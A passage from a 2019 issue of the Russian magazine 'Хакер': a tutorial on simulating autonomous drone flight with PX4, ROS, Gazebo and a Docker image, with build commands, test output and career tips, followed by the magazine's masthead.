тве, ей будет присвоен такой же дескриптор и алгоритм сможет сказать: «Вот
на этом кадре есть такая же точка, что и на предыдущем».
   Алгоритм не знает 3D‐координаты осо бых точек и координаты камеры
в моменты съемок кадров — эти параметры ему как раз и надо вычислить. Он
отслеживает изменения пиксельных координат особых точек между кад рами
и пытается подобрать такие параметры, чтобы, если спроецировать особые
точки в плоскость кадра, получались наб людаемые или изме ренные пиксель‐
ные координаты.
  В итоге получается оценка перемещения камеры в прос транстве. Обычно
алгоритм SLAM очень требова телен к вычислитель ным ресурсам, но есть
камера Intel RealSense T265 с микросхемой, реализующей вычисления SLAM
на аппаратном уровне.
  Для организации автономного управления дро ном необходимо решить
три задачи.
 1. Определить коор динаты дрона в прос транстве. Использовать для этого
  GPS‐приемник или вычис лять на борту координаты, обрабаты вая виде‐
   опоток алгоритмом SLAM. А лучше использовать оба подхода, чтобы знать
   как глобальные, так и локальные координаты дрона
 2. Построить 3D‐карту окру жения дро на с помощью сенсоров типа стереока‐
   мер, камер глубины, лидаров.
 3. Добавить софт для планирования маршрута с учетом цели полета, текущих
   координат и карты окру жения.


ПРАКТИКА
Поскольку мы хотим затестить прос тую программу управле ния дроном в авто‐
номном режиме и при этом ничего не раз бить, воспользуемся эмулятором.
Нам понадобится сле дующий софт.


По летный кон трол лер
Непосредственно вращением моторов и полетом дрона управляет полетный
контроллер, представляющий собой плату Pixhawk с процессором ARM
на борту и прошивкой под наз ванием PX4. Сам программный код PX4 можно
скомпилировать в режиме software  in the loop как раз для тестирования
на персональном компь ютере на Intel x84 CPU. Софт PX4 в этом режиме
думает, что он работает на реальном железе полетного контрол лера, хотя
на самом деле он выполняется в симуля ционной среде на ПК и получает под‐
менные данные с сенсоров.





Robot Operating System
Нам потребуется много разных программных модулей. Одни будут работать
с сенсорами, другие будут реализовывать SLAM, третьи — строить 3D‐карту,
четвертые — планировать в ней безопасный маршрут. Для создания этих
модулей мы исполь зуем Robot Operating System (ROS) — распространенный
фреймворк  для  разработки  приложений  робототехники.  При ложение
для ROS представляет собой набор вза имодейству ющих пакетов, каждый
экземпляр которых называется узел, или node.
  Один из узлов называется мас тер (master node) и отвечает за регистра‐
цию остальных узлов приложения. Каж дый узел представляет собой отдель‐
ный процесс Linux. ROS предос тавляет механизм передачи и синхронизации
сообщений между узла ми. Существу ют как стандартные сообщения, так
и определенные программистом. В качестве сообщений выс тупают данные
с сенсоров, видеокадры, облака точек, команды управления и передачи
параметров.
   Узлы ROS могут быть запущены на разных машинах — в этом слу чае вза‐
имодействуют они через сетевой интерфейс. В составе ROS есть специаль‐
ный узел rviz, он служит для гра фической визу ализации передаваемых в ROS
сообщений. Нап ример, можно посмотреть, как БПЛА видит мир вокруг себя,
отобразить траекторию его движения и видеопо ток с камеры.
  Для создания пакетов ROS предос тавляет воз можность использовать
языки C++ и Python.


Программный симулятор реального мира Gazebo
Все эти программные средс тва должны брать данные с сенсоров и управлять
чем‐то. Программе неважно, работать ли с реаль ными или симуляционными
датчиками и актуаторами, поэто му все алгоритмы можно сначала протес‐
тировать на компьюте ре, в мире Gazebo.
   Gazebo симулирует взаимо действие робота с окружающим прос транс‐
твом. Качественная трехмерная графика здесь позволяет увидеть мир
и робота как в компьютерной игре. Есть встроенная модель физики мира
и возможность использовать раз ные физические датчики, видеокамеры,
дальномеры. Набор сущес тву ющих сенсоров можно при желании допол нять
своими, создавая плагины. Измерения сенсоров моделируются с задава‐
емым уровнем шума.
  В Gazebo есть готовые окру жения и примеры заданий и, конечно же, мож‐
но создавать свои. Помимо плагинов‐сенсоров, можно делать и програм‐
мные. Например, ты можешь описать в виде программы модель работы
мотора, которая задаст зависимость меж ду сигналом контроллера и тягой
двигателя.


Об раз Docker
Чтобы развернуть у себя на компь ютере описанную среду симуляции, надо
поставить большое количество программных пакетов, и могут возникнуть
проблемы с зависимостями. Что бы сэкономить тебе время, я создал образ
Docker с уже настроенными пакета ми и нужным нам софтом для первого тес‐
та дрона в Gazebo.
  Найти контейнер можно на моем гит хабе — заходи и скачивай.


Как работает софт управле ния
В нашем простейшем примере дрон будет летать очень примитивно.
 1. Источник координат дрона — не SLAM, а симулированный сигнал GPS.
 2. Дрон в симуляторе не строит карту окружающего пространства.
 3. Дрон летает по заранее заданной траекто рии.

Для первого теста впол не неплохо.


ЗАПУСК СОФТА
Сначала ставим Docker и пакеты Python.


sudo apt install python‐wstool python‐catkin‐tools ‐y

Качаем образ и софт.


export FASTSENSE_WORKSPACE_DIR=/home/urock/work/px4
cd $FASTSENSE_WORKSPACE_DIR
mkdir ‐p catkin_ws/src # Сюда будем клонировать ROS модуль управления
mkdir ‐p Firmware # Тут будет скомпилирован код PX4 в режиме sitl
cd catkin_ws/src
git clone git@github.com:FastSense/px4_ros_gazebo.git .
wstool init . # Создает ROS workspace

Собираем образ.


сd catkin_ws/src
docker build . ‐t x_kinetic_img # x_kinetic_img — имя создаваемого
образа

Скачиваем и компилируем код PX4 в режиме sitl внутри образа Docker.


сd catkin_ws/src
./docker/docker_x.sh x_kinetic_img make_firmware
# После компиляции должно открыться окошко Gazebo с дроном, лежащим
на асфальте
# После каждого запуска контейнера его надо убивать
# Извини, но с Docker я на вы и пока ничего умнее не придумал
docker rm $(docker ps ‐a ‐q)





                     Симуляция в Gazebo

Запускаем контейнер в режиме bash, компилиру ем и запускаем тест.


сd catkin_ws/src
./docker/docker_x.sh x_kinetic_img bash


# Внутри docker‐контейнера
cd /src/catkin_ws/
catkin build
source devel/setup.bash # Это надо сделать только после первой сборки
roslaunch simple_goal simple_goal.launch

Ты дол жен увидеть такое же окош ко Gazebo, в котором дрон начнет летать.
В консоли ты получишь вот такой вывод:



  [ INFO] [1577108810.425081938, 19.404000000]: FCU: ARMED by Arm/Disarm
  component command
  [ INFO] [1577108811.792807760, 20.660000000]: FCU: Takeoff detected


Тест должен закончиться так.



  [Testcase: test_posctl] ... ok
  ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
  SUMMARY:
  * RESULT: SUCCESS
  * TESTS: 1
  * ERRORS: 0 []
  * FAILURES: 0 []


На ошибки вроде этой не обращай внимания, их выдает PX4 по неизвестной
мне причине.



  [ERROR] [1577108798.707247440, 7.804000000]: ODOM: Ex: Could not find a
  connection between 'local_origin_ned' and 'fcu' because they are not
  part of the same tree.Tf has two or more unconnected trees.





Для завершения процесса нажимай Ctrl‐C.


Посмотрим на код
Мой репозиторий Fast Sense осно ван на материалах команды, которая раз‐
работала PX4 — самый популярный опенсорсный полетный контрол лер
в мире.
   У этих ребят есть своя инс трукция по запуску в Docker, а на их гитхабе ты
найдешь код модуля автономного управления, который я перенес в свой
репозиторий, чтобы все находилось в одном мес те.
  Код управления на Python совсем небольшой, я уверен, ты сможешь в нем
разобраться самостоятельно. Я лишь ска жу, что начинать надо с чтения фун‐
кции test_posctl(self). В ней описана логика полета: дрон переводится
в режим OFFBOARD, затем армится, взлетает и начина ет полет по точкам (0,
0, 0), (5, 5, 2), (5, ‐5, 2), (‐5, ‐5, 2), (0, 0, 2). Пос ле чего
садится и дисармится.


ЧТО ДАЛЬШЕ?
Если ты заинтересовался темой программирования беспилотников, то у тебя
есть масса самых разных воз можнос тей получить подходящее образование
или заниматься самостоятельно. Вот нес коль ко советов, которые помогут
сориентироваться.
 • Начинать осваивать профес сию программиста‐робототехника можно уже
   со школы.
 • Выбирай вуз, где есть робототехнические кафед ры. Если не можешь
   поехать в Стэнфорд, MIT или ETH Zurich — выбирай МФТИ, Скол тех
   или НГТУ (наверняка есть и другие наши силь ные вузы, но в этих трех я
  знаю сильные команды, которые занимаются дронами).
 • Приходи на стажировку к нам в Fast Sense.
 • Собирай команду и участвуй в хакато нах COEX — COEX World Skills.
 • И задавай вопросы в комментариях или пиши мне на почту.

До встречи!
    №12 (249)
          Андрей Пись мен ный        Илья Русанен          Алексей Глазков
              Главный редактор       Зам. главного редактора     Выпускающий редактор
               pismenny@glc.ru        по техническим вопросам          glazkov@glc.ru
                                            rusanen@glc.ru
                                 Евгения Шарипова
                                     Литературный редактор


                           РЕДАКТОРЫ РУБРИК
          Андрей Пись мен ный        Илья Русанен        Иван «aLLy» Андреев
               pismenny@glc.ru             rusanen@glc.ru         iam@russiansecurity.expert
            Евгений Зобнин          Татьяна Чупрова        Андрей Васильков
                 zobnin@glc.ru              chuprova@glc.ru        the.angstroem@gmail.com
                   Вален тин Холмогоров     Виктор Олейников
                           valentin@holmogorov.ru     fabulous.faberge@yandex.ru


                          MEGANEWS
                           Мария Нефёдова
                                            nefedova@glc.ru


                                  АРТ
                                      yambuto
                                      yambuto@gmail.com


                               РЕКЛАМА

                                  Анна Яковлева
                               Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                             Вопросы по под писке: lapina@glc.ru
                            Вопросы по материалам: support@glc.ru





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Олегович, 400046, Волгоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080,
город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, ком ната 54, офис 7. Зарегистри ровано в Федеральной службе
по надзору в сфере связи, информационных технологий и массовых ком муника ций (Роскомнадзоре), свидетельство Эл № ФС77‐67001 от 30.
08.2016 года. Мнение редакции не обязатель но совпада ет с мнением авторов. Все материалы в номере предоставляются как информация
к размышлению. Лица, использующие данную информацию в противозаконных целях, могут быть привлечены к ответс твен ности. Редакция
не несет ответственности за содер жание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование
редакционных материалов жур нала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2019